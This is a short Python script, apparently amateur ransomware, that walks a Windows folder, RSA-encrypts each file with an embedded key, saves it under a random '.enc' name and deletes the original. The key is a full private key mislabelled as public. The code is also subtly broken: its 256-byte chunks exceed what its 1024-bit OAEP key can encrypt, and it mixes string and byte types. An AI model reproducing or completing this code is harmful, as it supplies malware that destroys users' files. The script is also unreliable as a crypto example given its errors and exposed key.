import zlib, random, os
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

def string_encoded(plaintext):
	public_key = """-----BEGIN RSA PRIVATE KEY-----
MIICXAIBAAKBgQC9RfZE+sbdF3dqV2+wbrX9zYWF69kZZpxparcgfl4l0m0zT/V/
iRZg/DgpkjR50liDdorTZDfiUSVx4qFtQ7Gbzati7D0CkWW0VJMbyeK3Y+V6vTs3
N4oEBEqsWKtrVn0NMfVScfjnaraNXY4EpeiUJfkzPUv8Qx4qNXD6WGn9cQIDAQAB
AoGBAITIhTnlWQgYg202RCPZt5GD0q2eRSM9ynNmK2z/WltcYcHC0a8UZH/L0jbP
3EKun+wyiLg+sbnzRbq8zJUUDY/TuLQvJpgIHGJcDs7+tR9nPwLRN9ejKg38qhpI
2ufeU1ckyHN3oLbdXCyMBDTIxpz+zaKQ+TsvqNqJhSf5JrlVAkEAzPf6f7VPM8Cl
TVsJLPH/Z7hZCYsBF/mCR0JucUpr5+YsrjO+UATWQHWTacBLk7jZb8oKynXbB70I
r0wPZ1Ik6wJBAOxlnMC5neRD/Ta1JA9vORre0T42AXd33hdBblh95bIFsyx64V2u
KeL1/hxP662/pZFQoXoSBh84yLwMu7CjwBMCQFFSae7VbtEns+4XGnLcqOrr91eT
8SEj+45uSwdj8aAWcM/E89MnuCHnBE/G3bWEd7CkxtdBH1/YnmN+l/X0X3UCQH3d
hF6g9c5p3NJaE/8byx3hcStced9wNRHQxr3bGod0vXd7Xa8RYj/zlf7hFq0GE1OR
yMhD/Hp3M3nclbpxFX0CQBNwD5h7brXjOtOG8y/Top9IQsHS5nFG/H/LtefGvnVz
CeQ8k8yjOI4VzpGKVSsjmSLqwnJBFRzEJpgTyEFIFso=
-----END RSA PRIVATE KEY-----"""
	rsakey = RSA.importKey(public_key)
	rsakey = PKCS1_OAEP.new(rsakey)
	plaintext = zlib.compress(plaintext)
	offset = 0
	chunk_size = 256
	encrypted = ""
	while offset < len(plaintext):
		chunk = plaintext[offset:offset+256]
		
		encrypted += rsakey.encrypt(chunk)
		offset += chunk_size
		
	return encrypted

	

def NAME():
	return ''.join([random.choice("1234567890") for i in xrange(0,15)])
	
		


for filename in os.listdir("C:\\Users\\x\\python\\files"):
	f = open("python\\files\\"+filename+"", "rb")
	contents = f.read()
	f.close()
	string_encoded(contents)
	name = NAME()
	fts = open("python\\files\\"+name+".enc", "w")
	fts.write(string_encoded(contents))
	fts.close()
	os.remove("python\\files\\"+filename+"")





  